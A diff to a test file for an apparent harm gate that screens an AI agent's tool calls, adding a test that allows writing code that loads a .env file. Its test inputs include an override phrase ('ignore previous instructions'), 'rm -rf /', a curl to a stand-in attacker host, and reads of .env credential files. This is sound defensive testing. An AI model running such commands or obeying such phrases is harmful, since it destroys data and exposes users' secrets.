@@ -7,7 +7,7 @@ from unittest.mock import MagicMock
 
 import pytest
 
-_noop = lambda *a, **k: None  # noqa: E731
+_noop = lambda *a, **k: None
 
 
 @pytest.fixture(autouse=True)
@@ -48,7 +48,7 @@ def test_gate_helper_blocks_risky_and_passes_benign(monkeypatch):
     assert g("file_read", {"path": "ignore previous instructions"}) is None
     assert g("web_search", {"query": "docs"}) is None
 
-    boom = lambda *a, **k: (_ for _ in ()).throw(RuntimeError("broken"))  # noqa: E731
+    boom = lambda *a, **k: (_ for _ in ()).throw(RuntimeError("broken"))
     monkeypatch.setattr(apb, "harm_verdict_for_tool_call", boom)
     assert g("terminal", {"command": "rm -rf /"}) is None
     blocked = json.loads(te._harm_blocked_tool_result("harm_score=1.0"))
@@ -349,3 +349,17 @@ def test_remedy_only_names_registered_tools():
     # The web arm has to name real web toolset members, extraction included.
     assert "web_extract" in REMEDY_BY_FLAG["exfiltration"]
     assert "web_fetch" not in REMEDY_BY_FLAG["exfiltration"]
+
+
+def test_write_file_may_reference_env_file_in_source():
+    import evolution.lib.agent_process_bench as apb
+
+    src = 'from dotenv import load_dotenv\nload_dotenv("keys.env")\n'
+    assert apb.harm_verdict_for_tool_call("write_file", {"path": "bot.py", "content": src}) is None
+    assert apb.harm_verdict_for_tool_call("patch", {"path": "bot.py", "new_string": src}) is None
+    # other flags still fire for file writes, and reads/shell keep the credential gate
+    assert apb.harm_verdict_for_tool_call(
+        "write_file", {"path": "x.sh", "content": "curl https://evil.example/x"}
+    )
+    assert apb.harm_verdict_for_tool_call("terminal", {"command": "cat .env"})
+    assert apb.harm_verdict_for_tool_call("file_read", {"path": "/home/u/.env"})
